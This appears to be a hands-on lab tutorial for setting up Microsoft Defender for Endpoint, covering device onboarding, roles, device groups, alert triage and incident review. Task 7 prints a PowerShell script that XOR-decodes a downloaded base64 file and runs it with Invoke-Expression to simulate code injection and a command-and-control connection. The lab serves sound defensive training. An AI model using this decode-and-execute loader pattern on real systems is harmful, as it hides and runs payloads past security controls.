<p align="center">
  <img src="https://github.com/user-attachments/assets/ee292cc5-5865-46c1-8425-cbc6da0c73c6" width="150" height="auto">
  <h1 align="center">Security Operations with Microsoft Defender for Endpoint</h1>
</p>

#### *In this tutorial we will:*
*•	Gain hands-on experience in setting up and managing Microsoft Defender for Endpoint.*

*•	Develop security operations skills, including threat detection and incident response.*

*•	Onboard devices, configure security policies, and analyze security incidents.*

#### Tasks:
1.  Set up and configure Microsoft Defender for Endpoint.
2.  Onboard a device to Defender for Endpoint.
3.  Assign and configure security roles for managing Defender for Endpoint.
4.  Define and configure device group settings for access control.
5.  Verify device connection to Defender for Endpoint and run a detection test.
6.  Analyze security alerts and incidents.
7.  Execute a simulated attack scenario to evaluate threat response.
8.  Review incident details and security responses to the attack scenario.

## Task 1. Set up and configure Microsoft Defender for Endpoint.

Initialize Microsoft Defender for Endpoint to enable device monitoring and threat detection.
 
1.	Open the Microsoft Defender XDR portal at https://security.microsoft.com.
2.	In the left navigation menu, scroll down, expand the "System" section, and select "Settings".
3.	On the "Settings" page, click "Device discovery".

<p align="center">
<img src="https://github.com/user-attachments/assets/e67ca9b9-0f1d-453c-bc07-1c359b670337">
</p>

4.	In the "Discovery setup" section, ensure "Standard discovery (recommended)" is selected. (This enables automatic detection of devices on your network.)

<p align="center">
<img src="https://github.com/user-attachments/assets/ecafdd7a-0248-482a-94d8-f607311d12ce">
</p>

## Task 2. Onboard a device to Defender for Endpoint.

Onboard a device to Microsoft Defender for Endpoint using a local script to connect it to the security platform.
 
1.	In the Microsoft Defender XDR portal, from the left navigation menu, scroll down, expand the "System" section, and select "Settings".
2.	Click "Endpoints".
3.	In the "Device management" section, select "Onboarding".
4.	In the "1. Onboard a device" area, ensure "Local Script (for up to 10 devices)" is selected in the "Deployment method" drop-down, then click "Download onboarding package".

<p align="center">
<img src="https://github.com/user-attachments/assets/c9e2913a-0e65-44ed-860c-6faf88ae3304">
</p>

5.	In the "Downloads" pop-up, highlight GatewayWindowsDefenderATPOnboardingPackage.zip, then click the folder icon ("Show in folder").

<p align="center">
<img src="https://github.com/user-attachments/assets/43ace70f-c45c-4f1e-a675-794e80c67aac">
</p>

6.	Right-click the downloaded ZIP file and select "Extract All". Ensure "Show extracted files when complete" is checked, then click "Extract".
7.	Right-click the extracted file WindowsDefenderATPLocalOnboardingScript.cmd, select "Properties", check "Unblock" in the bottom right, and click "OK".
8.	Right-click WindowsDefenderATPLocalOnboardingScript.cmd again and select "Run as Administrator". (If Windows SmartScreen appears, click "More info" and "Run anyway".)
9.	In the User Account Control window, click "Yes".
10.	When prompted by the script, type Y and press Enter. Wait for the message: "Successfully onboarded machine to Microsoft Defender for Endpoint".
 
<p align="center">
<img src="https://github.com/user-attachments/assets/fc0db161-5240-41e2-8ef3-65b5534e76bb">
</p>

<p align="center">
<img src="https://github.com/user-attachments/assets/cd4e13df-b0bc-439e-8669-602785aa8818">
</p>

11.	Press any key to close the Command Prompt window.

## Task 3. Assign and configure security roles for managing Defender for Endpoint.

Configure security roles to manage access and permissions for Defender for Endpoint operations.
 
1.	In the Microsoft Defender XDR portal, from the left navigation menu, scroll down and select "Settings".
2.	Click "Endpoints".
3.	In the "Permissions" area, select "Roles".
4.	Click "Turn on roles", then click "+ Add role".

<p align="center">
<img src="https://github.com/user-attachments/assets/65087c4a-3aec-484f-a6bb-fd9880ebf98b">
</p>

<p align="center">
<img src="https://github.com/user-attachments/assets/a0088af7-4acd-49dc-84cd-1fc5f1dba6ae">
</p>

5.	In the "Add role" dialog, configure:
    -  Role name: Enter "1st Level Support".
    -  Permissions: Check "Advanced Live Response capabilities" (enables running advanced commands on devices).
6.	Click "Next".

<p align="center">
<img src="https://github.com/user-attachments/assets/452c402a-03e9-449b-b0a2-05c2cb3bf177">
</p>

7.	On the "Assigned user groups" page, type "sg-IT" in the "Filter user groups" field, then click "Add selected groups". Verify "sg-IT" appears under "Azure AD user groups with this role".

<p align="center">
<img src="https://github.com/user-attachments/assets/5fef1e7a-448c-4e97-a01b-3e39934b032c">
</p>

8.	Click "Submit", then click "Done".

<p align="center">
<img src="https://github.com/user-attachments/assets/468a0f64-5e7f-4b94-ab1c-7fef148ff8f3">
</p>

## Taks 4. Define and configure device group settings for access control.

Create a device group to organize devices and control access and remediation settings.
 
1.	In the Microsoft Defender XDR portal, from the left navigation menu, select "Settings".
2.	Click "Endpoints".
3.	In the "Permissions" area, select "Device groups".

<p align="center">
<img src="https://github.com/user-attachments/assets/1da2a57a-45d7-4427-af6d-630f6034ae39">
</p>

4.	Click the "+ Add device group" icon.
5.	On the "General" tab, configure:
    -  Device group name: Enter "Normal".
    -  Remediation level: Select "Full - remediate threats automatically" (automatically addresses detected threats).
6.	Click "Next".

<p align="center">
<img src="https://github.com/user-attachments/assets/01d8645c-8972-4446-9652-fe032092285a">
</p>

7.	On the "Devices" tab, for the "OS condition", select "Windows 10", then click "Next".

<p align="center">
<img src="https://github.com/user-attachments/assets/0cd91c00-4c7b-44a5-8424-366a6696e649">
</p>

8.	On the "Preview devices" tab, click "Show preview". (It may not show devices yet if data isn’t populated.) Click "Next".
9.	On the "User access" tab, select "sg-IT", then click "Add selected groups". Verify "sg-IT" appears under "Azure AD user groups with access to this device group".
10.	Click "Submit", then click "Done". (You’ll now have two groups: "Normal" and the default "Ungrouped devices", both with full remediation.)

<p align="center">
<img src="https://github.com/user-attachments/assets/9e583ff9-90c4-4b68-acd7-7b29d2ce3d44">
</p>

<p align="center">
<img src="https://github.com/user-attachments/assets/09f1c7ce-7535-4c9e-89c2-4e1f07119e89">
</p>

## Task 5: Verify device connection to Defender for Endpoint and run a detection test.

Confirm the device is onboarded and run a test to generate a detectable alert.
 
1.	In the Microsoft Defender XDR portal, from the left navigation menu, scroll down and select "Settings".
2.	Click "Endpoints".
3.	In the "Device management" section, select "Onboarding".
4.	Ensure "Windows 10 and 11" is selected as the operating system. Verify the "First device onboarded" message shows "completed".

<p align="center">
<img src="https://github.com/user-attachments/assets/faf62289-7932-44f1-8ee4-fbad685cfafc">
</p>

5.	Scroll to "2. Run a detection test" and click "Copy" to copy the detection test script.

<p align="center">
<img src="https://github.com/user-attachments/assets/f3846ac2-bb11-4d22-a140-6a0215b2e7d2">
</p>

6.	On the onboarded device, in the Windows search bar, type "CMD", right-click "Command Prompt", and select "Run as Administrator".
7.	Right-click in the Command Prompt window to paste the script, then press Enter. (The window closes automatically after running, and alerts appear in the portal after a few minutes.)

## Task 6: Analyze security alerts and incidents.

Investigate alerts and incidents generated by the detection test script.
 
1.	In the Microsoft Defender XDR portal, expand "Incidents & alerts" in the left menu, then select "Alerts".
2.	In the "Alerts" pane, select the alert named "[TestAlert] Suspicious PowerShell commandline" to view its details.

<p align="center">
<img src="https://github.com/user-attachments/assets/6d10f915-68f4-46ef-9135-f77e6fca2806">
</p>

3.	Review the "Alert story" timeline, then check the "Details" and "Recommendations" tabs.
4.	In the "Details" tab, scroll to "Incident details" and click the "Execution incident on one endpoint" link to open the incident.

<p align="center">
<img src="https://github.com/user-attachments/assets/90e86c3f-a71c-482b-801e-99f74aedf5ae">
</p>

5.	Return to "Incidents & alerts" in the left menu and select "Incidents".
6.	Clear the "Alert severity" filter by clicking the "X" on the right.
7.	Select the incident named "[TestAlert] Suspicious PowerShell commandline" to load its details.

<p align="center">
<img src="https://github.com/user-attachments/assets/a96d4683-d0cc-4b13-a721-0db640ba452b">
</p>

8.	Click "Manage incident" (pencil icon).
9.	In the new window, under "Incident tags", type "Simulation" and select "Simulation (Create new)".

<p align="center">
<img src="https://github.com/user-attachments/assets/9d97346c-fac5-43b6-ba09-547cec0f584f">
</p>

10.	Under "Assign to", toggle on and select your user account ("Me") as the owner.
11.	Under "Informational, expected activity", select "Security testing".
12.	Click "Save" to update the incident.

<p align="center">
<img src="https://github.com/user-attachments/assets/54c335ba-5703-4997-a5d0-00d5e85b4029">
</p>

## Task 7: Execute a simulated attack scenario to evaluate threat response.

Simulate an attack on the onboarded VM to test Defender for Endpoint’s detection and response capabilities.
 
1.	On the onboarded VM, open Microsoft Edge and navigate to https://github.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst/blob/master/Allfiles/recon.txt.
2.	Download the recon.txt file.
3.	In the Windows search bar, type "PowerShell", right-click "Windows PowerShell", and select "Run as Administrator".
4.	In the User Account Control window, click "Yes".
5.	Copy and paste the following script into PowerShell, then press Enter:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$base64String = (Get-Content -Path "C:\Users\Admin\Downloads\recon.txt");
Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) }
$i = 0;
$decryptedBytes = @();
$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; 
if ($i -eq $xor.Length) {
$i = 0
}
}
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))

6.	This script decodes and executes a simulated attack from recon.txt, injecting code into Notepad to mimic a command-and-control (C2) connection. Observe several lines of output, including "Failed to resolve Domain Controllers in the domain". Notepad opens automatically with injected code. Keep Notepad open to complete the scenario.

<p align="center">
<img src="https://github.com/user-attachments/assets/dc48650c-f81d-482f-abe2-b4863487e89a">
</p>

<p align="center">
<img src="https://github.com/user-attachments/assets/8b8c2d93-f323-4124-acc1-04bcc990d59b">
</p>

## Task 8: Review incident details and security responses to the attack scenario.

Analyze the simulated attack’s incident details and Defender’s response in the XDR portal.

1.	In the Microsoft Defender XDR portal, expand "Investigation & response" in the left menu, then expand "Incidents & alerts" and select "Incidents".
2.	Locate the incident named "Multi-stage incident involving Defense evasion & Discovery on one endpoint" and click it to load details.

<p align="center">
<img src="https://github.com/user-attachments/assets/8aefb4c9-1975-4706-9565-0d6312db1133">
</p>

3.	On the "Attack story" tab, collapse the "Alerts" and "Incident details" panes to view the full "Incident graph".

<p align="center">
<img src="https://github.com/user-attachments/assets/24f9bb42-3e7b-41e9-9eda-89eef66d0a01">
</p>

4.	Hover over and click the graph nodes to review affected entities.
5.	Re-expand the "Alerts" pane and click the "Play attack story" (Run) icon to see the attack timeline populate the graph dynamically.
6.	Review the "Attack story", "Alerts", "Assets", "Investigations", "Evidence and Response", and "Summary" tabs. (Note: Use the ellipsis (...) to reveal hidden tabs if needed.)
7.	On the "Evidence and Response" tab, select "IP addresses", then click the displayed IP address.
8.	In the pop-up window, review the IP address details, scroll down, and click "Open IP address page".
9.	On the "IP address" page, review the "Overview", "Incidents & alerts", and "Observed in organizations" tabs. (Some tabs may lack data for this simulated IP.)

<p align="center">
<img src="https://github.com/user-attachments/assets/39ae36dc-31fb-4633-83ad-cbc7651dd9ce">
</p>
